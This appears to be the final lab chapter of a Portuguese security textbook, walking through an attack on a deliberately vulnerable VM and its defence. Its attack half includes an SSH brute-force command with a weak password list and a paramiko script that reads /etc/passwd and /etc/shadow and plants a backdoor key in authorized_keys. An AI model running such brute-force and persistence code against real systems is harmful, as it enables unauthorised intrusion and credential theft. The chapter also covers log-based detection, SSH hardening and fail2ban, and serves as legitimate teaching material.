# Capítulo 19 — Laboratório Final

**Objetivos deste capítulo:**
- Montar um cenário completo de ataque e defesa
- Usar as ferramentas do livro em sequência
- Simular um ataque real: recon → exploração → persistência
- Simular uma defesa real: detecção → contenção → investigação

---

## Cenário

Você é um profissional de segurança contratado para testar a proteção de uma pequena empresa. A rede tem:

- **Alvo**: servidor Linux (Metasploitable 2 ou Ubuntu vulnerável) em `192.168.1.100`
- **Atacante**: seu Kali/Ubuntu com as ferramentas do livro
- **Defensor**: o mesmo servidor executando os scripts de defesa

Você vai executar o ciclo completo:

1. **Reconhecimento** — descobrir portas abertas e serviços
2. **Exploração** — tentar acessar via SSH com força bruta
3. **Pós-exploração** — manter acesso, capturar dados
4. **Detecção** — identificar o ataque pelos logs
5. **Resposta** — conter e analisar

---

## Fase 1: Reconhecimento (Red Team)

Use o scanner de portas para descobrir serviços no alvo:

```bash
python3 kit.py scan 192.168.1.100 --portas 1-10000 --threads 200
```

Saída esperada (Metasploitable 2):
```
PORTA    21 → ABERTA [FTP]
PORTA    22 → ABERTA [SSH]
PORTA    23 → ABERTA [Telnet]
PORTA    25 → ABERTA [SMTP]
PORTA    80 → ABERTA [HTTP]
PORTA   139 → ABERTA [NetBIOS]
PORTA   445 → ABERTA [SMB]
PORTA  3306 → ABERTA [MySQL]
PORTA  5900 → ABERTA [VNC]
PORTA  8009 → ABERTA [AJP]
```

Com base no resultado, sabemos que o alvo tem SSH (porta 22) — podemos tentar força bruta. Também tem HTTP (porta 80) — podemos explorar aplicações web.

---

## Fase 2: Força bruta SSH (Red Team)

Com as portas mapeadas, vamos tentar acessar o SSH com senhas comuns:

```bash
# Primeiro, crie uma lista de senhas
echo -e "admin\n123456\nsenha\npassword\nroot\nteste\nuser" > senhas.txt

# Execute o brute force
python3 kit.py ssh root@192.168.1.100 --senhas senhas.txt --delay 0.5
```

Se encontrar a senha, você terá acesso ao shell remoto via SSH.

---

## Fase 3: Pós-exploração (Red Team)

Com acesso SSH ao servidor, vamos executar comandos para manter o acesso e coletar informações:

```python
#!/usr/bin/env python3
"""
Pós-exploração automatizada.
Uso: python3 pos_exploracao.py host usuario senha
"""

import paramiko
import sys

def executar_comando(ssh, comando):
    stdin, stdout, stderr = ssh.exec_command(comando)
    return stdout.read().decode(errors="ignore")

if len(sys.argv) < 4:
    print("Uso: pos_exploracao.py host usuario senha")
    sys.exit(1)

host, usuario, senha = sys.argv[1], sys.argv[2], sys.argv[3]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(host, username=usuario, password=senha, timeout=5)

# Coleta informações do sistema
print("=== Informações do Sistema ===")
print(executar_comando(ssh, "uname -a"))
print(executar_comando(ssh, "whoami"))
print(executar_comando(ssh, "id"))
print(executar_comando(ssh, "cat /etc/passwd | grep -E ':/home|:/root'"))

# Verifica arquivos sensíveis
print("\n=== Arquivos Sensíveis ===")
print(executar_comando(ssh, "ls -la /root/ 2>&1"))
print(executar_comando(ssh, "cat /etc/shadow 2>&1 | head -5"))  # Requer root

# Cria backdoor simples
print("\n=== Instalando Persistência ===")
# Adiciona chave pública do atacante ao authorized_keys
print(executar_comando(ssh, 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys 2>/dev/null'))
print("Chave adicionada (se o diretório existir)")

ssh.close()
```

---

## Fase 4: Detecção (Blue Team)

Agora mude para o lado azul. No servidor alvo, analise os logs para detectar o ataque:

```bash
# Analisar logs SSH
python3 kit.py logs /var/log/auth.log
```

Saída esperada:
```
════════════════════════════════════════════════════════
ANÁLISE DE LOG — 50+ eventos
════════════════════════════════════════════════════════
192.168.1.50  falhas= 47  sucessos= 1  ⚠ BRUTE FORCE
192.168.1.100 falhas= 12  sucessos= 3  ⚠ BRUTE FORCE
```

O log mostra o ataque. Veja:
- O IP atacante (`192.168.1.50` no exemplo) tem 47 falhas e 1 sucesso — força bruta detectada
- É possível ver exatamente quando o acesso foi obtido

---

## Fase 5: Hardening e correção (Blue Team)

Com base nas descobertas, execute o hardening para fechar as vulnerabilidades:

```bash
python3 kit.py hardening
```

Resultado:
```
✅ Firewall ativo
❌ SSH com senha fraca → desabilitar autenticação por senha
❌ Usuário root com acesso SSH → bloquear
❌ Portas não esperadas → fechar serviços desnecessários
```

Ações corretivas:
```bash
# Desabilitar login root via SSH
echo "PermitRootLogin no" >> /etc/ssh/sshd_config

# Usar apenas chaves SSH
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
systemctl restart sshd

# Fechar portas desnecessárias (ex: telnet, FTP)
ufw deny 23
ufw deny 21

# Ativar fail2ban para prevenir brute force
apt install fail2ban -y
```

---

## Laboratório completo — script único

Para facilitar, aqui está um script que executa o cenário completo:

```python
#!/usr/bin/env python3
"""
Laboratório Final — Ataque e Defesa.
Uso: sudo python3 lab_final.py <alvo>
"""

import sys
import os
import time

ALVO = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.100"

print("=" * 60)
print("LABORATÓRIO FINAL — ATAQUE E DEFESA")
print(f"Alvo: {ALVO}")
print("=" * 60)

# Fase 1: Reconhecimento
print("\n[FASE 1] Reconhecimento — Scanner de portas")
os.system(f"python3 kit.py scan {ALVO} --portas 1-5000 --threads 200")

# Fase 2: Força bruta
print("\n[FASE 2] Exploração — Força bruta SSH")
time.sleep(2)
# Cria lista de senhas
with open("/tmp/senhas_lab.txt", "w") as f:
    f.write("\n".join(["admin", "123456", "senha", "password", "root", "user"]))
os.system(f"python3 kit.py ssh root@{ALVO} --senhas /tmp/senhas_lab.txt --delay 0.3")

# Fase 3: Detecção
print("\n[FASE 3] Detecção — Analisando logs")
time.sleep(1)
os.system(f"python3 kit.py logs /var/log/auth.log")
os.system(f"python3 kit.py logs /var/log/syslog")

# Fase 4: Hardening
print("\n[FASE 4] Resposta — Hardening")
time.sleep(1)
os.system("python3 kit.py hardening")

print("\n" + "=" * 60)
print("LABORATÓRIO CONCLUÍDO")
print("=" * 60)
```

---

## Exercícios do Laboratório

### Exercício 1 — Monte seu próprio laboratório

Instale o Metasploitable 2 ou uma VM Ubuntu vulnerável. Configure a rede para que o Kali e o alvo se comuniquem. Execute o laboratório completo.

### Exercício 2 — Documente o ataque

Para cada fase, registre:
- Quais ferramentas foram usadas
- Quais comandos foram executados
- Quais informações foram coletadas
- Quanto tempo levou cada fase

### Exercício 3 — Crie um plano de defesa

Com base nos resultados do hardening, crie um plano de ação:
1. O que foi corrigido imediatamente
2. O que precisa de mudança de configuração
3. O que precisa de política de segurança (treinamento, senhas fortes)

### Exercício 4 — Automatize a defesa

Crie um script que:
1. Executa o hardening automaticamente ao iniciar
2. Monitora /var/log/auth.log em tempo real (use watchdog ou polling)
3. Bloqueia IPs com mais de 5 tentativas falhas em 10 minutos (use iptables)

---

## Resumo do Capítulo

- Um **ataque real** segue: recon → exploração → pós-exploração → persistência
- Uma **defesa real** segue: detecção → análise → contenção → correção
- As ferramentas do livro cobrem ambos os lados
- O **hardening** preventivo é a melhor defesa contra força bruta
- **Logs** são a principal fonte de evidência — sempre analise-os

---

## Conclusão do Livro

Você chegou ao fim.

Este livro começou com **algoritmos em Portugol** — sem computador, apenas raciocínio lógico. Terminou com um **kit completo de ferramentas de segurança** em Python, capaz de escanear redes, testar senhas, capturar pacotes, detectar invasões e endurecer sistemas.

O caminho foi longo, mas cada passo foi construído sobre o anterior:

1. **Lógica de programação** — a base de tudo
2. **Python** — a ferramenta que deu vida aos algoritmos
3. **Ferramentas práticas** — o elo entre teoria e prática
4. **Ataque e defesa** — os dois lados da segurança

O mais importante: você não copiou código. Você **entendeu** cada linha. Sabe por que um timeout é necessário, por que um hash protege integridade, por que rate limiting impede brute force, por que logs são a memória do sistema.

Agora siga. Construa. Teste. E, acima de tudo, use esse conhecimento com responsabilidade.

*— Prof. Dony*